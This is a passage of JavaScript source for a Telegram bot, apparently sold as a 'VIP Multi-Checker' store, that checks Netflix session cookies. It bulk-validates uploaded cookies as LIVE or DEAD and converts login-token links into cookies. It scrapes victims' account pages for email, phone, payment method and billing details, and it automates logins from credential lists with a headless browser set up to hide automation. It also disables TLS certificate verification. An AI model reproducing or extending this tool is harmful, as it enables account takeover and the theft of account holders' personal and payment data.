// Membaca file .env jika ada (jika tidak ada, ganti langsung token di bawah)
require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');
const AdmZip = require('adm-zip'); // Library untuk handle zip secara presisi

// --- INISIALISASI BOT & CACHE ---
const bot = new Telegraf(process.env.BOT_TOKEN); 
const tokenCache = new Map(); 
const activeConvertModes = new Map(); // 🔥 DATABASE SEMENTARA UNTUK MENGINGAT MODE USER
const lastBulkResults = new Map(); // 🌟 CACHE SEMENTARA HASIL BULK TERAKHIR PER USER UNTUK /satukan
const hitCache = new Map(); // 🌟 CACHE SEMENTARA UNTUK HASIL LINK DARI /HIT
// --- DATABASE & SETTING OWNER ---
const USER_DB_FILE = 'users.json'; 
const PEMBELI_DB_FILE = 'pembeli.json'; 
const OWNER_ID = 5420881452; 
const REQUIRED_CHANNEL = '@corvast';

// --- SETTING KANAL ARSIP OWNER ---
const LOG_CHANNEL_ID = '-1004431346293'; 
const REMINDER_CHANNEL_ID = '-1004488997480'; 

// --- FUNGSI PEMETAAN NEGARA & BENDERA LENGKAP GLOBAL ---
function getCountryDetail(countryCode) {
    if (!countryCode || countryCode === 'Not Detected') return { name: 'Not Detected', flag: '' };
    
    // Ambil string kode negara bersih (misal dari "🇿🇦 ZA" atau "ZA" diambil "ZA")
    const cleanCode = countryCode.replace(/[\p{Emoji}\s]/gu, '').toUpperCase().trim();
    const code = cleanCode.length > 2 ? cleanCode.slice(-2) : cleanCode;
    
    const countryMap = {
        'ID': { name: 'Indonesia', flag: '🇮🇩' },
        'BR': { name: 'Brazil', flag: '🇧🇷' },
        'US': { name: 'United States', flag: '🇺🇸' },
        'SG': { name: 'Singapore', flag: '🇸🇬' },
        'PH': { name: 'Philippines', flag: '🇵🇭' },
        'MY': { name: 'Malaysia', flag: '🇲🇾' },
        'TH': { name: 'Thailand', flag: '🇹🇭' },
        'VN': { name: 'Vietnam', flag: '🇻🇳' },
        'TR': { name: 'Turkey', flag: '🇹🇷' },
        'IN': { name: 'India', flag: '🇮🇳' },
        'GB': { name: 'United Kingdom', flag: '🇬🇧' },
        'CA': { name: 'Canada', flag: '🇨🇦' },
        'AU': { name: 'Australia', flag: '🇦🇺' },
        'JP': { name: 'Japan', flag: '🇯🇵' },
        'KR': { name: 'South Korea', flag: '🇰🇷' },
        'DE': { name: 'Germany', flag: '🇩🇪' },
        'FR': { name: 'France', flag: '🇫🇷' },
        'IT': { name: 'Italy', flag: '🇮🇹' },
        'ES': { name: 'Spain', flag: '🇪🇸' },
        'MX': { name: 'Mexico', flag: '🇲🇽' },
        'CO': { name: 'Colombia', flag: '🇨🇴' },
        'AR': { name: 'Argentina', flag: '🇦🇷' },
        'CL': { name: 'Chile', flag: '🇨🇱' },
        'PE': { name: 'Peru', flag: '🇵🇪' },
        'NL': { name: 'Netherlands', flag: '🇳🇱' },
        'PL': { name: 'Poland', flag: '🇵🇱' },
        'ZA': { name: 'South Africa', flag: '🇿🇦' },
        'AE': { name: 'United Arab Emirates', flag: '🇦🇪' },
        'SA': { name: 'Saudi Arabia', flag: '🇸🇦' },
        'NZ': { name: 'New Zealand', flag: '🇳🇿' },
        'UA': { name: 'Ukraine', flag: '🇺🇦' },
        'PK': { name: 'Pakistan', flag: '🇵🇰' },
        'EG': { name: 'Egypt', flag: '🇪🇬' },
        'NG': { name: 'Nigeria', flag: '🇳🇬' },
        'IL': { name: 'Israel', flag: '🇮🇱' }
    };

    return countryMap[code] || { name: code, flag: '' };
}

// --- HELPER FUNCTION GENERATOR ---
function readAccountsGen() {
    try {
        if (!fs.existsSync('account.txt')) return [];
        const data = fs.readFileSync('account.txt', 'utf8');
        return data.split('\n').filter(line => line.trim() !== '').map(line => {
            const [username, password] = line.split(':');
            return { username: username.trim(), password: password.trim() };
        });
    } catch (error) {
        return [];
    }
}

async function waitForElementGen(page, selector, timeout = 30000) {
    try {
        await page.waitForSelector(selector, { timeout: timeout, state: 'visible' });
        return true;
    } catch (error) {
        return false;
    }
}

async function getLinkFromCodeboxGen(page) {
    try {
        const codeboxVisible = await waitForElementGen(page, '.codebox', 30000);
        if (!codeboxVisible) return null;
        const link = await page.$eval('.codebox code', el => el.textContent.trim());
        if (link && link.includes('https://netflix.com/?nftoken=')) return link;
        return null;
    } catch (error) {
        return null;
    }
}

async function checkPartnerGen(page) {
    try {
        const planElements = await page.$$('.kx-kv');
        for (const element of planElements) {
            const label = await element.$eval('.k', el => el.textContent.trim());
            if (label === 'Plan') {
                const value = await element.$eval('.v', el => el.textContent.trim());
                if (value.includes('PARTNER')) return true;
                return false;
            }
        }
        return false;
    } catch (error) {
        return false;
    }
}
// ----------------------------------
// --- FUNGSI EKSTRAKSI LINK LOGIN DARI TEKS ---
function extractLinksFromText(text) {
    if (!text) return [];
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const matches = text.match(urlRegex) || [];
    return matches.filter(url => url.includes('nftoken=') || url.includes('LoginSecure'));
}

// --- FUNGSI AUTO FORWARD ERROR KE OWNER ---
async function notifyOwnerError(ctx, contextMsg, error) {
    try {
        const user = ctx.from ? `@${ctx.from.username} (ID: ${ctx.from.id})` : 'Sistem Background';
        const errorText = `🚨 <b>SYSTEM ERROR ALERT!</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━━━\n` +
                          `👤 <b>User/Pemicu:</b> ${user}\n` +
                          `📍 <b>Lokasi Error:</b> ${contextMsg}\n` +
                          `⚠️ <b>Pesan Error:</b>\n<code>${error.message}</code>`;
        
        await bot.telegram.sendMessage(OWNER_ID, errorText, { parse_mode: 'HTML' });
    } catch (e) {
        console.error("Gagal mengirim error ke owner:", e.message);
    }
}

// --- FUNGSI RESOLVE LINK LOGIN MENJADI COOKIE MENTAH ---
async function resolveLinkToCookie(targetUrl) {
    try {
        let currentUrl = targetUrl;
        let netflixId = '', secureNetflixId = '', nfvdid = '';
        let combinedCookies = '';
        let attempt = 0;

        while (attempt < 5) {
            const response = await axios.get(currentUrl, {
                maxRedirects: 0,
                validateStatus: (status) => status >= 200 && status <= 302,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Cookie': combinedCookies 
                },
                timeout: 10000
            });

            const setCookieHeaders = response.headers['set-cookie'];
            if (setCookieHeaders) {
                setCookieHeaders.forEach(cookieStr => {
                    const cookiePart = cookieStr.split(';')[0];
                    const key = cookiePart.split('=')[0];
                    const val = cookiePart.substring(key.length + 1);

                    if (key === 'NetflixId') netflixId = val;
                    if (key === 'SecureNetflixId') secureNetflixId = val;
                    if (key === 'nfvdid') nfvdid = val;

                    combinedCookies += `${cookiePart}; `;
                });
            }

            if (response.status === 301 || response.status === 302) {
                currentUrl = response.headers.location;
                if (!currentUrl.startsWith('http')) {
                    currentUrl = `https://www.netflix.com${currentUrl}`;
                }
                attempt++;
            } else {
                break;
            }
        }

        if (netflixId && secureNetflixId) {
            return `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}; ${nfvdid ? 'nfvdid=' + nfvdid + ';' : ''}`;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// --- 1. JALANKAN BANNER DI AWAL ---
function showWelcomeBanner() {
    const cyan = "\x1b[36m";
    const red = "\x1b[31m";
    const bold = "\x1b[1m";
    const gray = "\x1b[90m";
    const green = "\x1b[32m";
    const reset = "\x1b[0m";

    console.log(`\n${red}${bold} █▀▀█ █▀▀▀ █▀▀█ █▀▀▀ ▀▀█▀▀ █▀▀█ █▀▀█ 
 █▄▄█ █─▀█ █▄▄█ ▀▀▀█ ──█── █▄▄▀ █▄▄█ 
 ▀──▀ ▀▀▀▀ ▀──▀ ▀▀▀▀ ──▀── ▀─▀▀ ▀──▀${reset}`);
    console.log(`${cyan}${bold} █▀▀▀ █─█ █▀▀▀ █▀▀▀ █─█ █▀▀▀ █▀▀█   
 █─── █▀█ █▀▀▀ █─── █▀▄ █▀▀▀ █▄▄▀ 
 ▀▀▀▀ ▀─▀ ▀▀▀▀ ▀▀▀▀ ▀─▀ ▀▀▀▀ ▀─▀▀ 
 ───────────────────────────────────${reset}`);
    console.log(`${cyan}${bold} WELCOME OWNER AGASTRA STORE - WINDOWS LOCAL SYSTEM${reset}`);
    console.log(`${cyan}${bold}==================================================${reset}`);
    console.log(`${gray}[${new Date().toLocaleTimeString()}]${reset} Core system status: ${green}PREPARED (CMD MODE)${reset}`);
    console.log(`${gray}[${new Date().toLocaleTimeString()}]${reset} Connection: Secure Bypass Token Enabled`);
    console.log(`${gray}[${new Date().toLocaleTimeString()}]${reset} Polling: Local Telegram Listener Active`);
    console.log(`${cyan}${bold}--------------------------------------------------${reset}`);
    console.log(`🚀 \x1b[42m\x1b[30m SYSTEM ONLINE \x1b[0m Agastra VIP Multi-Checker is running on PC...\n`);
}

showWelcomeBanner();

// --- 2. TAMPILAN LOGGER PANEL ESTETIK ---
function logToPanel(type, data) {
    const magenta = "\x1b[35m";
    const cyan = "\x1b[36m";
    const green = "\x1b[32m";
    const yellow = "\x1b[33m";
    const bold = "\x1b[1m";
    const reset = "\x1b[0m";
    const time = new Date().toLocaleTimeString();

    if (type === 'SATUAN') {
        console.log(`${magenta}${bold}┌── [CONVERT SATUAN INDIVIDUAL] ───────────────────────────┐${reset}`);
        console.log(`${magenta}${bold}│${reset} ⏰ Time     : ${time}`);
        console.log(`${magenta}${bold}│${reset} 👤 User     : ${data.name} (${data.username})`);
        console.log(`${magenta}${bold}│${reset} 🆔 Telegram : ${data.id}`);
        console.log(`${magenta}${bold}│${reset} 📧 Account  : ${data.email}`);
        console.log(`${magenta}${bold}│${reset} 🌍 Country  : ${data.country} | 🌐 Lang: ${data.language}`);
        console.log(`${magenta}${bold}│${reset} ⚡ Speed    : ${green}${data.duration} detik${reset}`);
        console.log(`${magenta}${bold}└── [AGASTRA LOG TRACKER SYSTEM] ──────────────────────────┘${reset}\n`);
    } else if (type === 'BULK') {
        console.log(`${cyan}${bold}┌── [BULK VERIFICATION MASSAL] ────────────────────────────┐${reset}`);
        console.log(`${cyan}${bold}│${reset} ⏰ Time     : ${time}`);
        console.log(`${cyan}${bold}│${reset} 👤 Operator : ${data.name} (${data.username})`);
        console.log(`${cyan}${bold}│${reset} 📦 Database : ${yellow}${data.fileName}${reset}`);
        console.log(`${cyan}${bold}│${reset} 📊 Total DB : ${data.total} Cookies`);
        console.log(`${cyan}${bold}│${reset} 🟢 Result   : ${green}${data.live} LIVE${reset} | 🔴 ${data.dead} DEAD`);
        console.log(`${cyan}${bold}└── [AGASTRA LOG TRACKER SYSTEM] ──────────────────────────┘${reset}\n`);
    }
}

// --- 3. SISTEM DATABASE STRUKTUR ---
function loadUsers() {
    try {
        if (!fs.existsSync(USER_DB_FILE)) {
            fs.writeFileSync(USER_DB_FILE, JSON.stringify([], null, 2));
            return [];
        }
        const data = fs.readFileSync(USER_DB_FILE, 'utf8');
        let parsed = JSON.parse(data);
        if (Array.isArray(parsed) && parsed.length > 0 && typeof parsed[0] !== 'object') {
            parsed = parsed.map(id => ({ id: Number(id), username: 'User VIP', count: 0 }));
            fs.writeFileSync(USER_DB_FILE, JSON.stringify(parsed, null, 2));
        }
        return parsed;
    } catch (e) { return []; }
}

function saveUser(ctx, userId, username = 'User VIP') {
    let users = loadUsers();
    let userIndex = users.findIndex(u => u.id === userId);
    if (userIndex === -1) {
        users.push({ id: userId, username: username, count: 0 });
        fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));
        triggerAutoBackup(ctx, username, userId);
    } else if (username !== 'User VIP' && users[userIndex].username !== username) {
        users[userIndex].username = username;
        fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));
    }
}

async function triggerAutoBackup(ctx, newUsername, newUserId) {
    try {
        if (!fs.existsSync(USER_DB_FILE)) return;
        const totalUser = loadUsers().length;
        const captionBackup = `🔔 <b>AUTO BACKUP NOTIFICATION</b>\n──────────────────────────\n👤 <b>User Baru:</b> ${newUsername}\n🆔 <b>ID Telegram:</b> <code>${newUserId}</code>\n📊 <b>Total Database:</b> <code>${totalUser} User Terdaftar</code>\n──────────────────────────\n📌 <i>Berkas database users.json otomatis di-backup demi keamanan.</i>`;
        
        await ctx.telegram.sendDocument(OWNER_ID, { source: USER_DB_FILE }, { caption: captionBackup, parse_mode: 'HTML' });
    } catch (err) {
        console.error("⚠️ Gagal mengirim file auto-backup ke owner:", err.message);
    }
}

function loadPembeli() {
    try {
        if (!fs.existsSync(PEMBELI_DB_FILE)) {
            fs.writeFileSync(PEMBELI_DB_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(PEMBELI_DB_FILE, 'utf8'));
    } catch (e) { return []; }
}

function savePembeli(pembeliList) {
    fs.writeFileSync(PEMBELI_DB_FILE, JSON.stringify(pembeliList, null, 2));
}

function addConvertScore(userId, totalPoints = 1) {
    let users = loadUsers();
    let userIndex = users.findIndex(u => u.id === userId);
    if (userIndex !== -1) {
        users[userIndex].count = (users[userIndex].count || 0) + totalPoints;
        fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));
    }
}

// --- KONSTANTA API NETFLIX ARGO ---
const ARGO_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
const ARGO_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.iosversion": "15.8.5",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.app-version": "15.48.1"
};
const httpsAgent = new https.Agent({ rejectUnauthorized: false });

// =========================================================================================
// --- UNIVERSAL ENGINE V5 (AUTO-SPACER UNTUK FORMAT COOKIES DEMPET / GLUED) ---
// =========================================================================================
function parseCookies(text) {
    let cookieDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
    if (!text || typeof text !== 'string') return cookieDict;

    let trimmed = text.trim();

    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
        try {
            const parsedJson = JSON.parse(trimmed);
            const deepSearch = (obj) => {
                if (!obj || typeof obj !== 'object') return;
                if (obj.name && obj.value !== undefined) {
                    if (obj.name === 'NetflixId') cookieDict['NetflixId'] = obj.value;
                    if (obj.name === 'SecureNetflixId') cookieDict['SecureNetflixId'] = obj.value;
                    if (obj.name === 'nfvdid') cookieDict['nfvdid'] = obj.value;
                }
                for (let key in obj) {
                    if (typeof obj[key] === 'object') deepSearch(obj[key]);
                }
            };
            deepSearch(parsedJson);
            if (cookieDict['NetflixId']) return cookieDict;
        } catch (e) {}
    }

    // 🌟 SMART SPACER: Mencegah error akibat cookie format "nempel" tanpa spasi
    let safeText = trimmed
        .replace(/(SecureNetflixId)/ig, ' $1')
        .replace(/(nfvdid)/ig, ' $1')
        .replace(/(NetflixId)/ig, ' $1');

    const targets = ['NetflixId', 'SecureNetflixId', 'nfvdid'];
    targets.forEach(target => {
        const globalRegex = new RegExp(`${target}[\\s:=]+([^;\\s\\}\\"\\|]+)`, 'i');
        const match = safeText.match(globalRegex);
        if (match && match[1]) {
            let value = match[1].trim();
            if (value.endsWith(',')) value = value.slice(0, -1);
            cookieDict[target] = value;
        }
    });

    return cookieDict;
}
// 🌟 SISTEM GLOBAL BROWSER BIKIN RINGAN
let globalBrowser = null;
let globalAccountIndex = 0;
const hitQueue = [];
let isProcessingHit = false;
async function startGlobalBrowser() {
    console.log("🌐 Memulai Global Browser untuk Auto-Scraper...");
    globalBrowser = await chromium.launch({
        headless: true, // Wajib true biar ringan dan bisa jalan barengan di background
        args: ['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-dev-shm-usage']
    });
    console.log("✅ Global Browser Ready!");
}
startGlobalBrowser(); // Jalanin otomatis pas bot nyala
function buildCookieString(cookieDict) {
    let cookies = [];
    if (cookieDict['NetflixId']) cookies.push(`NetflixId=${cookieDict['NetflixId']}`);
    if (cookieDict['SecureNetflixId']) cookies.push(`SecureNetflixId=${cookieDict['SecureNetflixId']}`);
    if (cookieDict['nfvdid']) cookies.push(`nfvdid=${cookieDict['nfvdid']}`);
    return cookies.join('; ');
}

function cleanCookieInput(text) {
    if (!text) return '';
    return text.replace(/&amp;/g, '&').replace(/\\"/g, '"').trim();
}

function extractCookiesFromRawText(fileContent) {
    let cookiesFound = [];
    if (!fileContent || typeof fileContent !== 'string') return cookiesFound;

    const trimmed = fileContent.trim();

    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
        try {
            const parsedJson = JSON.parse(trimmed);
            if (Array.isArray(parsedJson)) {
                parsedJson.forEach(item => {
                    if (item && typeof item === 'object') {
                        if (item.cookies && Array.isArray(item.cookies)) {
                            let tempDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                            item.cookies.forEach(c => {
                                if (c.name === 'NetflixId') tempDict['NetflixId'] = c.value;
                                if (c.name === 'SecureNetflixId') tempDict['SecureNetflixId'] = c.value;
                                if (c.name === 'nfvdid') tempDict['nfvdid'] = c.value;
                            });
                            if (tempDict['NetflixId']) cookiesFound.push(buildCookieString(tempDict));
                        }
                    }
                });
            }
            if (cookiesFound.length > 0) return [...new Set(cookiesFound)];
            let finalDict = parseCookies(trimmed);
            if (finalDict['NetflixId']) return [buildCookieString(finalDict)];
        } catch (e) {}
    }

    const rawLines = fileContent.split(/\r?\n/);
    let currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
    let rawBufferJson = "";
    let insideJsonBlock = false;

    for (let line of rawLines) {
        let currentLine = line.trim();
        if (!currentLine || currentLine.startsWith('#')) continue;

        currentLine = currentLine.replace(/^\d+[\.\s\)]+\s*/, '');

        if (currentLine.includes('.netflix.com')) {
            let parts = currentLine.split(/\s+/);
            if (parts.length >= 6) {
                let name = parts[parts.length - 2];
                let value = parts[parts.length - 1];
                if (['NetflixId', 'SecureNetflixId', 'nfvdid'].includes(name)) {
                    if (currentDict[name] !== null) {
                        cookiesFound.push(buildCookieString(currentDict));
                        currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                    }
                    currentDict[name] = value;
                }
            }
        } 
        else if (currentLine.match(/^(?:NetflixId|SecureNetflixId|nfvdid)[\s:=]+/i) || currentLine.includes('NetflixId') || currentLine.includes('SecureNetflixId')) {
            let tempDict = parseCookies(currentLine);
            
            if (tempDict['NetflixId'] && tempDict['SecureNetflixId']) {
                if (currentDict['NetflixId'] || currentDict['SecureNetflixId']) {
                    cookiesFound.push(buildCookieString(currentDict));
                    currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                }
                cookiesFound.push(buildCookieString(tempDict));
                continue;
            }

            let conflict = false;
            if (tempDict['NetflixId'] && currentDict['NetflixId']) conflict = true;
            if (tempDict['SecureNetflixId'] && currentDict['SecureNetflixId']) conflict = true;
            if (tempDict['nfvdid'] && currentDict['nfvdid']) conflict = true;

            if (conflict) {
                cookiesFound.push(buildCookieString(currentDict));
                currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
            }

            if (tempDict['NetflixId']) currentDict['NetflixId'] = tempDict['NetflixId'];
            if (tempDict['SecureNetflixId']) currentDict['SecureNetflixId'] = tempDict['SecureNetflixId'];
            if (tempDict['nfvdid']) currentDict['nfvdid'] = tempDict['nfvdid'];
        } 
        else {
            if (currentLine.startsWith('{') || currentLine.includes('"name":')) insideJsonBlock = true;
            if (insideJsonBlock) {
                rawBufferJson += currentLine;
                if (currentLine.startsWith('}') || currentLine.endsWith('},') || currentLine.endsWith('}')) {
                    try {
                        const cleanSingleObj = rawBufferJson.endsWith(',') ? rawBufferJson.slice(0, -1) : rawBufferJson;
                        const parsedObj = JSON.parse(cleanSingleObj);
                        if (parsedObj.name && parsedObj.value) {
                            if (parsedObj.name === 'NetflixId') currentDict['NetflixId'] = parsedObj.value;
                            if (parsedObj.name === 'SecureNetflixId') currentDict['SecureNetflixId'] = parsedObj.value;
                            if (parsedObj.name === 'nfvdid') currentDict['nfvdid'] = parsedObj.value;
                            
                            if (currentDict['NetflixId'] && currentDict['SecureNetflixId']) {
                                cookiesFound.push(buildCookieString(currentDict));
                                currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                            }
                        }
                    } catch (err) {}
                    rawBufferJson = "";
                }
            }
        }
    }

    if (currentDict['NetflixId']) {
        cookiesFound.push(buildCookieString(currentDict));
    }

    if (cookiesFound.length === 0) {
        let fallbackDict = parseCookies(fileContent);
        if (fallbackDict['NetflixId']) cookiesFound.push(buildCookieString(fallbackDict)); 
    }

    return [...new Set(cookiesFound)];
}

function decodeHexEscapes(s) {
    if (!s) return s;
    return s.replace(/\\x([0-9A-Fa-f]{2})/g, (_, p1) => String.fromCharCode(parseInt(p1, 16)))
            .replace(/\\u([0-9A-Fa-f]{4})/g, (_, p1) => String.fromCharCode(parseInt(p1, 16)));
}

function parseTextData(text) {
    let data = { email: null, phone: null, plan: null, nextBill: null, extraMember: "No", region: null, payment: null, memberSince: null };
    const emailMatch = text.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/);
    if (emailMatch) data.email = emailMatch[1].trim();

    const phoneMatch = text.match(/(?:phoneNumber|Phone|Telepon|HP|phonenumber)\s*[:=]\s*([+\d]+)/i);
    if (phoneMatch) data.phone = phoneMatch[1].trim();

    if (text.includes('┃')) {
        const parts = text.split('┃').map(p => p.trim());
        if (parts[0] && !data.email) data.email = parts[0].replace(/^Form:\s*/i, '');
        if (parts[1] && !data.plan) data.plan = parts[1];
        if (parts[2] && !data.nextBill) data.nextBill = parts[2];
        if (parts[3]) data.extraMember = parts[3];
        if (parts[4] && !data.region) data.region = parts[4];
        if (parts[5] && !data.payment) data.payment = parts[5];
    }
    return data;
}

// --- 6. FUNGSI UTAMA SCRAPER INFO AKUN NETFLIX ---
async function checkAccountInfo(cookieString) {
    try {
        const startTimeFetch = Date.now();
        const headers = {
            'Cookie': cookieString,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8'
        };

        const response = await axios.get('https://www.netflix.com/YourAccount', { 
            headers, 
            timeout: 25000, 
            validateStatus: (status) => status >= 200 && status < 400,
            maxRedirects: 7
        });
        
        const html = response.data;
        if (!html || typeof html !== 'string') return { status: 'DEAD' };

        const isPageValid = html.includes('netflix.reactContext') || html.includes('MEMBER_HOVER') || html.includes('member-sign-out') || html.includes('header-id') || html.includes('profile-selector') || html.includes('avatar-wrapper') || html.includes('\"email\"') || html.includes('\"accountData\"');
        if (!isPageValid || response.status === 401) return { status: 'DEAD' };

        let plan = 'Not Detected', email = 'Not Detected', country = 'Not Detected';
        let payment = 'Not Detected', nextBill = 'Not Detected', memberSince = 'Not Detected';
        let language = 'Not Detected', extraMember = 'No', authURL = null;
        let profileNames = 'Not Detected', pinStatus = '-';
        let apiPhone = 'Tidak Terdeteksi';
        
        let holdPaymentStatus = "Aman (No Hold) 🟢"; 

        const strictHoldKeywords = [
            'account-alert', 'payment-hold', 'payAction', 'updatePlaybackStatus', 
            'tidak dapat memproses pembayaran', 'update your payment', 'payment wallet hold', 
            'membership_hold', 'suspend', 'paymentRetry', 'warn-icon', 'bento-alert', 
            'rejoin-banner', 'verify-payment', 'payment-error', 'action-required-payment',
            'fix-payment', 'membership-frozen', 'billing-problem', 'hold-membership'
        ];

        const isHoldStringFound = strictHoldKeywords.some(keyword => html.includes(keyword));
        if (isHoldStringFound) {
            holdPaymentStatus = "HOLD / SUSPENDED 🔴";
        }

        const reactContextMatch = html.match(/netflix\.reactContext\s*=\s*({.+?});<\/script>/) || html.match(/netflix\.reactContext\s*=\s*({.+?});/);
        if (reactContextMatch) {
            try {
                const cleanJson = decodeHexEscapes(reactContextMatch[1]);
                const context = JSON.parse(cleanJson);
                
                const acData = context?.models?.accountData?.data || context?.models?.memberHomeData?.data;
                const signupContext = context?.models?.signupContext?.data?.flow?.fields;
                const userInfo = context?.models?.userInfo?.data;
                const memberStatus = context?.models?.membershipStatus?.data || context?.models?.memberHomeData?.data?.membershipStatus || context?.models?.membershipState?.data;
                const bentoData = context?.models?.bento?.data || context?.models?.bentoAlerts?.data;
                
                if (memberStatus) {
                    const statusString = JSON.stringify(memberStatus).toLowerCase();
                    if (
                        memberStatus.isHold === true || 
                        memberStatus.status === 'HOLD' || 
                        memberStatus.currentStatus === 'HOLD' || 
                        memberStatus.isInHold === true ||
                        memberStatus.isSuspended === true ||
                        statusString.includes('"ishold":true') ||
                        statusString.includes('"inhold":true') ||
                        statusString.includes('"status":"hold"')
                    ) {
                        holdPaymentStatus = "HOLD / SUSPENDED 🔴";
                    }
                }

                if (memberStatus?.isCancelled === true || memberStatus?.status === 'CANCELLED' || html.includes('"isCancelled":true')) {
                    holdPaymentStatus = "MEMBER CANCEL 🔴";
                }

                if (bentoData) {
                    const bentoString = JSON.stringify(bentoData).toLowerCase();
                    if (
                        bentoString.includes('hold') || 
                        bentoString.includes('fail') || 
                        bentoString.includes('reject') || 
                        bentoString.includes('decline') || 
                        bentoString.includes('update_payment') ||
                        bentoString.includes('alert_payment')
                    ) {
                        if (!bentoString.includes('nextbillingdate') && !bentoString.includes('billingformatteddate')) {
                            holdPaymentStatus = "HOLD / SUSPENDED 🔴";
                        }
                    }
                }

                let rawProfiles = context?.models?.userProfiles?.data || context?.models?.profiles?.data || context?.models?.profilesList?.data;
                if (!rawProfiles && userInfo?.profiles) rawProfiles = userInfo.profiles;
                if (!rawProfiles && acData?.profiles) rawProfiles = acData.profiles;

                if (Array.isArray(rawProfiles) && rawProfiles.length > 0) {
                    let namesArray = rawProfiles.map(p => {
                        if (typeof p === 'object') return p.profileName || p.rawTitle || p.firstName || p.name || p.title || '';
                        return p;
                    }).filter(name => name && name.trim() !== '' && !name.includes('{'));

                    if (namesArray.length > 0) profileNames = namesArray.join(', ');
                    const hasPin = rawProfiles.some(p => p.isLocked || p.isPinProtected || p.hasPin || p.pinProtected === true);
                    pinStatus = hasPin ? 'Protected 🔒' : 'Open 🔓';
                }

                if (signupContext) {
                    if (signupContext.currentPlan?.fields?.localizedPlanName?.value) plan = signupContext.currentPlan.fields.localizedPlanName.value;
                    if (signupContext.nextBillingDate?.value) nextBill = signupContext.nextBillingDate.value;
                    if (signupContext.memberSince?.value) {
                        const msTimestamp = signupContext.memberSince.value;
                        if (msTimestamp) memberSince = new Date(msTimestamp).toLocaleDateString('id-ID', { month: 'long', year: 'numeric' });
                    }
                    if (Array.isArray(signupContext.paymentMethods?.value) && signupContext.paymentMethods.value[0]) {
                        const pm = signupContext.paymentMethods.value[0].value;
                        payment = `${pm?.type?.value || 'CARD'} (${pm?.displayText?.value || ''})`.trim();
                    }
                }

                if (acData) {
                    email = acData.emailAddress || acData.email || email;
                    country = acData.countryOfSignup || acData.country || country;
                    if (plan === 'Not Detected') plan = acData.localizedPlanName?.value || plan;
                    if (nextBill === 'Not Detected') nextBill = acData.billingFormattedDate || acData.nextBillingDate || nextBill;
                    if (payment === 'Not Detected') payment = acData.paymentMethodDescription || acData.paymentMethodType || payment;
                    
                    if (acData.phoneNumber) apiPhone = typeof acData.phoneNumber === 'object' ? (acData.phoneNumber.value || 'Tidak Terdeteksi') : acData.phoneNumber;
                    if (acData.phone) apiPhone = typeof acData.phone === 'object' ? (acData.phone.value || 'Tidak Terdeteksi') : acData.phone;
                    if (acData.extraMembers || acData.hasExtraMembers || acData.extraMembersCount > 0) extraMember = 'Yes';
                }

                if (userInfo) {
                    email = userInfo.emailAddress || email;
                    if (userInfo.currentLocale) language = userInfo.currentLocale;
                }
                authURL = acData?.authURL || userInfo?.authURL || null;
            } catch (jsonErr) {}
        }

        if (email === 'Not Detected') {
            const emailMatch = html.match(/"emailAddress"\s*:\s*"([^"]+)"/) || html.match(/"email"\s*:\s*"([^"]+)"/);
            if (emailMatch) email = decodeHexEscapes(emailMatch[1]);
        }
        if (plan === 'Not Detected') {
            const planMatch = html.match(/"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/) || html.match(/"planName"\s*:\s*"([^"]+)"/);
            if (planMatch) plan = decodeHexEscapes(planMatch[1]);
        }
        if (country === 'Not Detected') {
            const countryMatch = html.match(/"countryOfSignup"\s*:\s*"([^"]+)"/) || html.match(/"countryCode"\s*:\s*"([^"]+)"/);
            if (countryMatch) country = decodeHexEscapes(countryMatch[1]);
        }
        if (nextBill === 'Not Detected') {
            const billMatch = html.match(/"billingFormattedDate"\s*:\s*"([^"]+)"/) || html.match(/"nextBillingDate"\s*:\s*"([^"]+)"/) || html.match(/data-uia="next-billing-date">([^<]+)</);
            if (billMatch) nextBill = decodeHexEscapes(billMatch[1]).trim();
        }
        if (memberSince === 'Not Detected') {
